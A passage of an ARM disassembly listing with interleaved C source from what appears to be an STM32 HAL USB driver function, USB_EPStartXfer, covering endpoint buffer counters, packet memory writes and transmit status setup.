 8007502:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007506:	b29b      	uxth	r3, r3
 8007508:	029b      	lsls	r3, r3, #10
 800750a:	b29b      	uxth	r3, r3
 800750c:	4313      	orrs	r3, r2
 800750e:	b29a      	uxth	r2, r3
 8007510:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007512:	801a      	strh	r2, [r3, #0]
 8007514:	e024      	b.n	8007560 <USB_EPStartXfer+0xb62>
 8007516:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800751a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800751e:	681b      	ldr	r3, [r3, #0]
 8007520:	785b      	ldrb	r3, [r3, #1]
 8007522:	2b01      	cmp	r3, #1
 8007524:	d11c      	bne.n	8007560 <USB_EPStartXfer+0xb62>
 8007526:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800752a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800752e:	681b      	ldr	r3, [r3, #0]
 8007530:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007534:	b29b      	uxth	r3, r3
 8007536:	461a      	mov	r2, r3
 8007538:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800753a:	4413      	add	r3, r2
 800753c:	673b      	str	r3, [r7, #112]	; 0x70
 800753e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007542:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007546:	681b      	ldr	r3, [r3, #0]
 8007548:	781b      	ldrb	r3, [r3, #0]
 800754a:	00da      	lsls	r2, r3, #3
 800754c:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800754e:	4413      	add	r3, r2
 8007550:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007554:	66fb      	str	r3, [r7, #108]	; 0x6c
 8007556:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800755a:	b29a      	uxth	r2, r3
 800755c:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 800755e:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 8007560:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007564:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007568:	681b      	ldr	r3, [r3, #0]
 800756a:	895b      	ldrh	r3, [r3, #10]
 800756c:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007570:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007574:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007578:	681b      	ldr	r3, [r3, #0]
 800757a:	6959      	ldr	r1, [r3, #20]
 800757c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007580:	b29b      	uxth	r3, r3
 8007582:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007586:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800758a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800758e:	6800      	ldr	r0, [r0, #0]
 8007590:	f000 ff41 	bl	8008416 <USB_WritePMA>
 8007594:	e0ca      	b.n	800772c <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8007596:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800759a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800759e:	681b      	ldr	r3, [r3, #0]
 80075a0:	785b      	ldrb	r3, [r3, #1]
 80075a2:	2b00      	cmp	r3, #0
 80075a4:	d177      	bne.n	8007696 <USB_EPStartXfer+0xc98>
 80075a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075aa:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075ae:	681b      	ldr	r3, [r3, #0]
 80075b0:	67fb      	str	r3, [r7, #124]	; 0x7c
 80075b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075b6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075ba:	681b      	ldr	r3, [r3, #0]
 80075bc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80075c0:	b29b      	uxth	r3, r3
 80075c2:	461a      	mov	r2, r3
 80075c4:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80075c6:	4413      	add	r3, r2
 80075c8:	67fb      	str	r3, [r7, #124]	; 0x7c
 80075ca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075ce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075d2:	681b      	ldr	r3, [r3, #0]
 80075d4:	781b      	ldrb	r3, [r3, #0]
 80075d6:	00da      	lsls	r2, r3, #3
 80075d8:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80075da:	4413      	add	r3, r2
 80075dc:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80075e0:	67bb      	str	r3, [r7, #120]	; 0x78
 80075e2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80075e4:	881b      	ldrh	r3, [r3, #0]
 80075e6:	b29b      	uxth	r3, r3
 80075e8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80075ec:	b29a      	uxth	r2, r3
 80075ee:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80075f0:	801a      	strh	r2, [r3, #0]
 80075f2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075f6:	2b3e      	cmp	r3, #62	; 0x3e
 80075f8:	d921      	bls.n	800763e <USB_EPStartXfer+0xc40>
 80075fa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075fe:	095b      	lsrs	r3, r3, #5
 8007600:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007604:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007608:	f003 031f 	and.w	r3, r3, #31
 800760c:	2b00      	cmp	r3, #0
 800760e:	d104      	bne.n	800761a <USB_EPStartXfer+0xc1c>
 8007610:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007614:	3b01      	subs	r3, #1
 8007616:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800761a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800761c:	881b      	ldrh	r3, [r3, #0]
 800761e:	b29a      	uxth	r2, r3
 8007620:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007624:	b29b      	uxth	r3, r3
 8007626:	029b      	lsls	r3, r3, #10
 8007628:	b29b      	uxth	r3, r3
 800762a:	4313      	orrs	r3, r2
 800762c:	b29b      	uxth	r3, r3
 800762e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007632:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007636:	b29a      	uxth	r2, r3
 8007638:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800763a:	801a      	strh	r2, [r3, #0]
 800763c:	e05c      	b.n	80076f8 <USB_EPStartXfer+0xcfa>
 800763e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007642:	2b00      	cmp	r3, #0
 8007644:	d10a      	bne.n	800765c <USB_EPStartXfer+0xc5e>
 8007646:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007648:	881b      	ldrh	r3, [r3, #0]
 800764a:	b29b      	uxth	r3, r3
 800764c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007650:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007654:	b29a      	uxth	r2, r3
 8007656:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007658:	801a      	strh	r2, [r3, #0]
 800765a:	e04d      	b.n	80076f8 <USB_EPStartXfer+0xcfa>
 800765c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007660:	085b      	lsrs	r3, r3, #1
 8007662:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007666:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800766a:	f003 0301 	and.w	r3, r3, #1
 800766e:	2b00      	cmp	r3, #0
 8007670:	d004      	beq.n	800767c <USB_EPStartXfer+0xc7e>
 8007672:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007676:	3301      	adds	r3, #1
 8007678:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800767c:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800767e:	881b      	ldrh	r3, [r3, #0]
 8007680:	b29a      	uxth	r2, r3
 8007682:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007686:	b29b      	uxth	r3, r3
 8007688:	029b      	lsls	r3, r3, #10
 800768a:	b29b      	uxth	r3, r3
 800768c:	4313      	orrs	r3, r2
 800768e:	b29a      	uxth	r2, r3
 8007690:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007692:	801a      	strh	r2, [r3, #0]
 8007694:	e030      	b.n	80076f8 <USB_EPStartXfer+0xcfa>
 8007696:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800769a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800769e:	681b      	ldr	r3, [r3, #0]
 80076a0:	785b      	ldrb	r3, [r3, #1]
 80076a2:	2b01      	cmp	r3, #1
 80076a4:	d128      	bne.n	80076f8 <USB_EPStartXfer+0xcfa>
 80076a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076aa:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076ae:	681b      	ldr	r3, [r3, #0]
 80076b0:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80076b4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076b8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076bc:	681b      	ldr	r3, [r3, #0]
 80076be:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80076c2:	b29b      	uxth	r3, r3
 80076c4:	461a      	mov	r2, r3
 80076c6:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80076ca:	4413      	add	r3, r2
 80076cc:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80076d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076d4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076d8:	681b      	ldr	r3, [r3, #0]
 80076da:	781b      	ldrb	r3, [r3, #0]
 80076dc:	00da      	lsls	r2, r3, #3
 80076de:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80076e2:	4413      	add	r3, r2
 80076e4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80076e8:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80076ec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076f0:	b29a      	uxth	r2, r3
 80076f2:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80076f6:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 80076f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076fc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007700:	681b      	ldr	r3, [r3, #0]
 8007702:	891b      	ldrh	r3, [r3, #8]
 8007704:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007708:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800770c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007710:	681b      	ldr	r3, [r3, #0]
 8007712:	6959      	ldr	r1, [r3, #20]
 8007714:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007718:	b29b      	uxth	r3, r3
 800771a:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800771e:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007722:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007726:	6800      	ldr	r0, [r0, #0]
 8007728:	f000 fe75 	bl	8008416 <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 800772c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007730:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007734:	681a      	ldr	r2, [r3, #0]
 8007736:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800773a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800773e:	681b      	ldr	r3, [r3, #0]
 8007740:	781b      	ldrb	r3, [r3, #0]
 8007742:	009b      	lsls	r3, r3, #2
 8007744:	4413      	add	r3, r2
 8007746:	881b      	ldrh	r3, [r3, #0]
 8007748:	b29b      	uxth	r3, r3
 800774a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800774e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8007752:	817b      	strh	r3, [r7, #10]
 8007754:	897b      	ldrh	r3, [r7, #10]
 8007756:	f083 0310 	eor.w	r3, r3, #16
 800775a:	817b      	strh	r3, [r7, #10]
 800775c:	897b      	ldrh	r3, [r7, #10]
 800775e:	f083 0320 	eor.w	r3, r3, #32
 8007762:	817b      	strh	r3, [r7, #10]
 8007764:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007768:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800776c:	681a      	ldr	r2, [r3, #0]
 800776e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007772:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007776:	681b      	ldr	r3, [r3, #0]
 8007778:	781b      	ldrb	r3, [r3, #0]
 800777a:	009b      	lsls	r3, r3, #2
 800777c:	441a      	add	r2, r3
 800777e:	897b      	ldrh	r3, [r7, #10]
 8007780:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007784:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007788:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800778c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007790:	b29b      	uxth	r3, r3
 8007792:	8013      	strh	r3, [r2, #0]
 8007794:	f000 bcde 	b.w	8008154 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 8007798:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800779c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077a0:	681b      	ldr	r3, [r3, #0]
 80077a2:	7b1b      	ldrb	r3, [r3, #12]
 80077a4:	2b00      	cmp	r3, #0
 80077a6:	f040 80bb 	bne.w	8007920 <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 80077aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077ae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077b2:	681b      	ldr	r3, [r3, #0]
 80077b4:	699a      	ldr	r2, [r3, #24]
 80077b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077ba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077be:	681b      	ldr	r3, [r3, #0]
 80077c0:	691b      	ldr	r3, [r3, #16]
 80077c2:	429a      	cmp	r2, r3
 80077c4:	d917      	bls.n	80077f6 <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 80077c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077ce:	681b      	ldr	r3, [r3, #0]
 80077d0:	691b      	ldr	r3, [r3, #16]
 80077d2:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 80077d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077da:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077de:	681b      	ldr	r3, [r3, #0]
 80077e0:	699a      	ldr	r2, [r3, #24]
 80077e2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077e6:	1ad2      	subs	r2, r2, r3
 80077e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077f0:	681b      	ldr	r3, [r3, #0]
 80077f2:	619a      	str	r2, [r3, #24]
 80077f4:	e00e      	b.n	8007814 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 80077f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077fe:	681b      	ldr	r3, [r3, #0]
 8007800:	699b      	ldr	r3, [r3, #24]
 8007802:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 8007806:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800780a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800780e:	681b      	ldr	r3, [r3, #0]
 8007810:	2200      	movs	r2, #0
 8007812:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 8007814:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007818:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800781c:	681b      	ldr	r3, [r3, #0]
 800781e:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 8007822:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007826:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800782a:	681b      	ldr	r3, [r3, #0]
 800782c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007830:	b29b      	uxth	r3, r3
 8007832:	461a      	mov	r2, r3
 8007834:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007838:	4413      	add	r3, r2
 800783a:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 800783e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007842:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007846:	681b      	ldr	r3, [r3, #0]
 8007848:	781b      	ldrb	r3, [r3, #0]
 800784a:	00da      	lsls	r2, r3, #3
 800784c:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007850:	4413      	add	r3, r2
 8007852:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007856:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 800785a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800785e:	881b      	ldrh	r3, [r3, #0]
 8007860:	b29b      	uxth	r3, r3
 8007862:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007866:	b29a      	uxth	r2, r3
 8007868:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800786c:	801a      	strh	r2, [r3, #0]
 800786e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007872:	2b3e      	cmp	r3, #62	; 0x3e
 8007874:	d924      	bls.n	80078c0 <USB_EPStartXfer+0xec2>
 8007876:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800787a:	095b      	lsrs	r3, r3, #5
 800787c:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007880:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007884:	f003 031f 	and.w	r3, r3, #31
 8007888:	2b00      	cmp	r3, #0
 800788a:	d104      	bne.n	8007896 <USB_EPStartXfer+0xe98>
 800788c:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007890:	3b01      	subs	r3, #1
 8007892:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007896:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800789a:	881b      	ldrh	r3, [r3, #0]
 800789c:	b29a      	uxth	r2, r3
 800789e:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 80078a2:	b29b      	uxth	r3, r3
 80078a4:	029b      	lsls	r3, r3, #10
 80078a6:	b29b      	uxth	r3, r3
 80078a8:	4313      	orrs	r3, r2
 80078aa:	b29b      	uxth	r3, r3
 80078ac:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078b0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078b4:	b29a      	uxth	r2, r3
 80078b6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078ba:	801a      	strh	r2, [r3, #0]
 80078bc:	f000 bc10 	b.w	80080e0 <USB_EPStartXfer+0x16e2>
 80078c0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078c4:	2b00      	cmp	r3, #0
 80078c6:	d10c      	bne.n	80078e2 <USB_EPStartXfer+0xee4>
 80078c8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078cc:	881b      	ldrh	r3, [r3, #0]
 80078ce:	b29b      	uxth	r3, r3
 80078d0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078d4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078d8:	b29a      	uxth	r2, r3
 80078da:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078de:	801a      	strh	r2, [r3, #0]
 80078e0:	e3fe      	b.n	80080e0 <USB_EPStartXfer+0x16e2>
 80078e2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078e6:	085b      	lsrs	r3, r3, #1
 80078e8:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 80078ec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078f0:	f003 0301 	and.w	r3, r3, #1
 80078f4:	2b00      	cmp	r3, #0
 80078f6:	d004      	beq.n	8007902 <USB_EPStartXfer+0xf04>
 80078f8:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 80078fc:	3301      	adds	r3, #1
 80078fe:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007902:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007906:	881b      	ldrh	r3, [r3, #0]
 8007908:	b29a      	uxth	r2, r3
 800790a:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800790e:	b29b      	uxth	r3, r3
 8007910:	029b      	lsls	r3, r3, #10
 8007912:	b29b      	uxth	r3, r3
 8007914:	4313      	orrs	r3, r2
 8007916:	b29a      	uxth	r2, r3
 8007918:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800791c:	801a      	strh	r2, [r3, #0]
 800791e:	e3df      	b.n	80080e0 <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 8007920:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007924:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007928:	681b      	ldr	r3, [r3, #0]
 800792a:	78db      	ldrb	r3, [r3, #3]
 800792c:	2b02      	cmp	r3, #2
 800792e:	f040 8218 	bne.w	8007d62 <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 8007932:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007936:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800793a:	681b      	ldr	r3, [r3, #0]
 800793c:	785b      	ldrb	r3, [r3, #1]
 800793e:	2b00      	cmp	r3, #0
 8007940:	f040 809d 	bne.w	8007a7e <USB_EPStartXfer+0x1080>
 8007944:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007948:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800794c:	681b      	ldr	r3, [r3, #0]
 800794e:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 8007952:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007956:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800795a:	681b      	ldr	r3, [r3, #0]
 800795c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007960:	b29b      	uxth	r3, r3
 8007962:	461a      	mov	r2, r3
 8007964:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007968:	4413      	add	r3, r2
 800796a:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 800796e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007972:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007976:	681b      	ldr	r3, [r3, #0]
 8007978:	781b      	ldrb	r3, [r3, #0]
 800797a:	00da      	lsls	r2, r3, #3
 800797c:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007980:	4413      	add	r3, r2
 8007982:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007986:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 800798a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 800798e:	881b      	ldrh	r3, [r3, #0]
 8007990:	b29b      	uxth	r3, r3
 8007992:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007996:	b29a      	uxth	r2, r3
 8007998:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 800799c:	801a      	strh	r2, [r3, #0]
 800799e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079a2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079a6:	681b      	ldr	r3, [r3, #0]
 80079a8:	691b      	ldr	r3, [r3, #16]
 80079aa:	2b3e      	cmp	r3, #62	; 0x3e
 80079ac:	d92b      	bls.n	8007a06 <USB_EPStartXfer+0x1008>
 80079ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079b2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079b6:	681b      	ldr	r3, [r3, #0]
 80079b8:	691b      	ldr	r3, [r3, #16]
 80079ba:	095b      	lsrs	r3, r3, #5
 80079bc:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 80079c0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079c4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079c8:	681b      	ldr	r3, [r3, #0]
 80079ca:	691b      	ldr	r3, [r3, #16]
 80079cc:	f003 031f 	and.w	r3, r3, #31
 80079d0:	2b00      	cmp	r3, #0
 80079d2:	d104      	bne.n	80079de <USB_EPStartXfer+0xfe0>
 80079d4:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 80079d8:	3b01      	subs	r3, #1
 80079da:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 80079de:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079e2:	881b      	ldrh	r3, [r3, #0]
 80079e4:	b29a      	uxth	r2, r3
 80079e6:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 80079ea:	b29b      	uxth	r3, r3
 80079ec:	029b      	lsls	r3, r3, #10
 80079ee:	b29b      	uxth	r3, r3
 80079f0:	4313      	orrs	r3, r2
 80079f2:	b29b      	uxth	r3, r3
 80079f4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80079f8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80079fc:	b29a      	uxth	r2, r3
 80079fe:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a02:	801a      	strh	r2, [r3, #0]
 8007a04:	e070      	b.n	8007ae8 <USB_EPStartXfer+0x10ea>
 8007a06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a0a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a0e:	681b      	ldr	r3, [r3, #0]
 8007a10:	691b      	ldr	r3, [r3, #16]
 8007a12:	2b00      	cmp	r3, #0
 8007a14:	d10c      	bne.n	8007a30 <USB_EPStartXfer+0x1032>
 8007a16:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a1a:	881b      	ldrh	r3, [r3, #0]
 8007a1c:	b29b      	uxth	r3, r3
 8007a1e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a22:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a26:	b29a      	uxth	r2, r3
 8007a28:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a2c:	801a      	strh	r2, [r3, #0]
 8007a2e:	e05b      	b.n	8007ae8 <USB_EPStartXfer+0x10ea>
 8007a30:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a34:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a38:	681b      	ldr	r3, [r3, #0]
 8007a3a:	691b      	ldr	r3, [r3, #16]
 8007a3c:	085b      	lsrs	r3, r3, #1
 8007a3e:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a46:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a4a:	681b      	ldr	r3, [r3, #0]
 8007a4c:	691b      	ldr	r3, [r3, #16]
 8007a4e:	f003 0301 	and.w	r3, r3, #1
 8007a52:	2b00      	cmp	r3, #0
 8007a54:	d004      	beq.n	8007a60 <USB_EPStartXfer+0x1062>
 8007a56:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a5a:	3301      	adds	r3, #1
 8007a5c:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
